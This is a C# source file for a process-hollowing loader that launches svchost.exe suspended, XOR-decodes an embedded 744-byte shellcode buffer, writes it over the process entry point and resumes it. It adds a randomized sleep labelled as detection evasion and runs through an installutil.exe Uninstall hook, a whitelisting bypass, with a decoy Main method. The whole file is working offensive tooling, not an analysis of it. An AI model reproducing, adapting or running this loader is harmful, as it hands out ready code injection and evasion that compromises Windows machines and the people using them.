using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

//C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe test.cs
//C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=true /U C:\\Users\\Administrator\\Desktop\\test.exe

namespace Process_Hollowing
{
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
        [DllImport("ntdll.dll")]
        public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniquePID;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        public const int PROCESSBASICINFORMATION = 0;
        public static class CreationFlags
        {
            public const uint SUSPENDED = 0x4;
        }
        public static void sleep()
        {
            var rand = new Random();
            uint randTime = (uint)rand.Next(10000, 20000);
            double decide = randTime / 1000 - 0.5;
            DateTime now = DateTime.Now;
            Console.WriteLine("[*] Sleeping for {0} seconds to evade detections...", randTime / 1000);
            Sleep(randTime);
            if (DateTime.Now.Subtract(now).TotalSeconds < decide)
            {
                return;
            }
        }

        public static void Hollow()
        {
            PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();
            STARTUPINFO startup_info = new STARTUPINFO();
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();

            string path = @"C:\\Windows\\System32\\svchost.exe";
            bool procINIT = CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED,
                IntPtr.Zero, null, ref startup_info, ref proc_info);
            if (procINIT == true)
            {
                Console.WriteLine("[*] Process create successfully.");
                Console.WriteLine("[*] Process ID: {0}", proc_info.dwProcessId);
            }
            else
            {
                Console.WriteLine("[-] Could not create the process.");
            }

            byte[] buf = new byte[744] {0x8f,0x38,0xe6,0x96,0x91,0x86,
0xb6,0x61,0x73,0x70,0x24,0x23,0x20,0x3e,0x28,0x30,0x3b,0x41,
0xb7,0x24,0x04,0x26,0xf1,0x33,0x13,0x38,0xee,0x20,0x79,0x26,
0xf1,0x33,0x53,0x38,0x6a,0xc5,0x2b,0x24,0x37,0x50,0xba,0x38,
0xee,0x00,0x31,0x26,0x4b,0xa1,0xdf,0x4c,0x04,0x0e,0x63,0x42,
0x5a,0x20,0xb2,0xb9,0x68,0x33,0x60,0xaf,0x98,0x8c,0x21,0x38,
0xee,0x20,0x41,0x2f,0x2b,0xea,0x31,0x4c,0x2d,0x73,0xb1,0x08,
0xfb,0x19,0x6b,0x7b,0x67,0x7d,0xe4,0x1c,0x7a,0x61,0x73,0xfb,
0xe5,0xfa,0x61,0x6e,0x7a,0x29,0xf6,0xb0,0x11,0x15,0x29,0x6f,
0xaa,0x31,0x37,0xfb,0x25,0x52,0xea,0x26,0x62,0x28,0x72,0xa0,
0x86,0x24,0x2c,0x5f,0xb3,0x29,0x8c,0xb9,0x24,0xf9,0x55,0xe6,
0x32,0x60,0xa5,0x38,0x54,0xb2,0x20,0xaf,0xb3,0x6c,0xdf,0x31,
0x64,0xb3,0x59,0x8e,0x0f,0x90,0x3f,0x73,0x29,0x56,0x69,0x2b,
0x43,0xb0,0x06,0xa8,0x3d,0x36,0xea,0x2e,0x5e,0x28,0x72,0xa0,
0x03,0x33,0xea,0x62,0x32,0x25,0xf8,0x30,0x79,0x3b,0x60,0xbe,
0x3b,0xea,0x77,0xf8,0x2d,0x73,0xb1,0x2f,0x22,0x20,0x2b,0x2e,
0x3c,0x28,0x20,0x36,0x3b,0x38,0x32,0x2a,0x2d,0xf1,0x8d,0x4e,
0x3b,0x33,0x8c,0x90,0x3d,0x33,0x38,0x34,0x32,0xea,0x61,0x99,
0x2e,0x8d,0x9e,0x91,0x27,0x29,0x42,0xab,0x36,0x3b,0xdf,0x19,
0x13,0x0f,0x1a,0x1e,0x00,0x06,0x61,0x2f,0x2c,0x29,0xfa,0x91,
0x2c,0xb5,0xa3,0x22,0x0d,0x47,0x74,0x8f,0xb0,0x21,0x32,0x26,
0xf3,0x80,0x20,0x2a,0x28,0x43,0xa1,0x23,0x4b,0xa8,0x20,0x23,
0x2c,0xc8,0x5b,0x38,0x03,0xc6,0x73,0x70,0x65,0x72,0x9e,0xbb,
0x92,0x6e,0x73,0x70,0x65,0x43,0x58,0x5c,0x54,0x50,0x45,0x48,
0x4b,0x46,0x54,0x40,0x48,0x50,0x45,0x70,0x3f,0x3a,0xe8,0xaf,
0x33,0xa6,0xb3,0xcb,0x64,0x72,0x61,0x23,0x4b,0xa8,0x20,0x23,
0x0f,0x71,0x32,0x27,0xc0,0x36,0xfa,0xef,0xa3,0x72,0x61,0x6e,
0x7a,0x9e,0xa6,0x98,0xd8,0x72,0x61,0x6e,0x55,0x54,0x06,0x32,
0x56,0x22,0x14,0x43,0x2e,0x20,0x2c,0x22,0x21,0x28,0x24,0x24,
0x17,0x2b,0x1b,0x48,0x01,0x1a,0x30,0x36,0x42,0x03,0x3d,0x22,
0x0e,0x19,0x32,0x56,0x3c,0x2f,0x1c,0x33,0x07,0x0a,0x19,0x2b,
0x10,0x26,0x36,0x3b,0x23,0x04,0x0b,0x3c,0x39,0x2f,0x10,0x08,
0x51,0x3a,0x11,0x3c,0x25,0x2e,0x5e,0x43,0x0b,0x1c,0x07,0x16,
0x39,0x12,0x1a,0x19,0x27,0x3a,0x32,0x17,0x17,0x31,0x44,0x09,
0x2f,0x0b,0x0a,0x19,0x57,0x08,0x1d,0x14,0x02,0x4b,0x14,0x09,
0x0d,0x23,0x40,0x2f,0x15,0x39,0x19,0x29,0x31,0x3e,0x39,0x47,
0x52,0x37,0x26,0x21,0x48,0x59,0x3b,0x19,0x02,0x1a,0x0b,0x27,
0x36,0x54,0x0b,0x23,0x2c,0x46,0x35,0x2a,0x1f,0x28,0x39,0x1c,
0x11,0x4a,0x2b,0x56,0x18,0x26,0x29,0x1f,0x0b,0x25,0x3b,0x00,
0x3b,0x18,0x12,0x00,0x36,0x25,0x0c,0x14,0x2a,0x0a,0x19,0x25,
0x0e,0x33,0x53,0x22,0x1c,0x27,0x2b,0x12,0x32,0x26,0x2a,0x5b,
0x33,0x12,0x37,0x3f,0x1d,0x1e,0x25,0x0b,0x49,0x23,0x5e,0x45,
0x36,0x42,0x17,0x18,0x03,0x18,0x42,0x1b,0x3a,0x1a,0x04,0x04,
0x36,0x39,0x01,0x27,0x65,0x3a,0xe8,0xaf,0x29,0x3b,0x32,0x28,
0x28,0x43,0xa8,0x3d,0x32,0xd9,0x73,0x42,0xcd,0xf6,0x61,0x6e,
0x7a,0x61,0x23,0x23,0x36,0x3b,0xa6,0xac,0x91,0x34,0x5d,0x4b,
0x9a,0xa7,0x29,0xe7,0xbc,0x0b,0x79,0x2f,0x2d,0xfb,0x90,0x04,
0x65,0x3b,0x21,0x18,0xe5,0x41,0x61,0x6e,0x33,0xe8,0x93,0x1a,
0x61,0x33,0x38,0x27,0xc0,0x14,0x35,0xee,0xe3,0x72,0x61,0x6e,
0x7a,0x9e,0xa6,0x3d,0x54,0xb2,0x32,0x34,0x32,0xe8,0x82,0x3d,
0x54,0xbb,0x2c,0x5f,0xb3,0x32,0x20,0x39,0xa2,0xb0,0x4c,0x68,
0x62,0x1a,0x8c,0xa5,0xe0,0xb2,0x14,0x71,0x32,0xa6,0xb2,0xf8,
0x76,0x72,0x61,0x27,0xc0,0x25,0x83,0x45,0x85,0x72,0x61,0x6e,
0x7a,0x9e,0xa6,0x38,0x9a,0xbd,0x15,0x6c,0x91,0xcb,0x9b,0x25,
0x65,0x72,0x61,0x3d,0x23,0x0b,0x33,0x2a,0x2c,0xfb,0xb0,0xaf,
0x98,0x71,0x3a,0xb7,0xa5,0x72,0x71,0x6e,0x7a,0x28,0xc9,0x28,
0xc1,0x21,0x84,0x6e,0x7a,0x61,0x73,0x8f,0xb0,0x3a,0xf2,0x3d,
0x29,0x29,0xfa,0x97,0x2d,0xfb,0x90,0x26,0xf3,0xbb,0x3a,0xb7,
0xa5,0x72,0x41,0x6e,0x7a,0x28,0xfa,0x89,0x2c,0xc8,0x73,0xf8,
0xf3,0x83,0x73,0x70,0x65,0x72,0x9e,0xbb,0x32,0xe2,0xb7,0x50,
0xe0,0xb2,0x15,0xdc,0x1c,0xea,0x74,0x38,0x64,0xb1,0xe4,0xae,
0x0f,0xb3,0x2b,0xb3,0x3d,0x18,0x61,0x37,0xc1,0x81,0x6e,0x5a,
0x6f,0x33,0xe8,0xb4,0x85,0xb4};

            String Keys = "speranza";
            int y = -1;
            for (int i = 0; i < buf.Length; i++)
            {
                y++;
                if (y >= Keys.Length) { y = 0; }
                buf[i] = (byte)(buf[i] ^ Keys[y]);
            }

            uint retLength = 0;
            IntPtr procHandle = proc_info.hProcess;
            IntPtr threadHandle = proc_info.hThread;
            ZwQueryInformationProcess(procHandle, PROCESSBASICINFORMATION, ref pbi, (uint)(IntPtr.Size * 6), ref retLength);
            IntPtr imageBaseAddr = (IntPtr)((Int64)pbi.PebAddress + 0x10);
            Console.WriteLine("[*] Image Base Address found: 0x{0}", imageBaseAddr.ToString("x"));

            byte[] baseAddrBytes = new byte[0x8];
            IntPtr lpNumberofBytesRead = IntPtr.Zero;
            ReadProcessMemory(procHandle, imageBaseAddr, baseAddrBytes, baseAddrBytes.Length, out lpNumberofBytesRead);
            IntPtr execAddr = (IntPtr)(BitConverter.ToInt64(baseAddrBytes, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(procHandle, execAddr, data, data.Length, out lpNumberofBytesRead);
            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            Console.WriteLine("[*] e_lfanew: 0x{0}", e_lfanew.ToString("X"));

            uint rvaOffset = e_lfanew + 0x28;
            uint rva = BitConverter.ToUInt32(data, (int)rvaOffset);
            IntPtr entrypointAddr = (IntPtr)((UInt64)execAddr + rva);
            Console.WriteLine("[*] Entrypoint Found: 0x{0}", entrypointAddr.ToString("X"));

            IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
            WriteProcessMemory(procHandle, entrypointAddr, buf, buf.Length, ref lpNumberOfBytesWritten);
            Console.WriteLine("[*] Memory written. Resuming thread...");
            ResumeThread(threadHandle);
        }
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            sleep();
            Hollow();
        }
    }
   
    public class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("No way!");
        }

    }
}
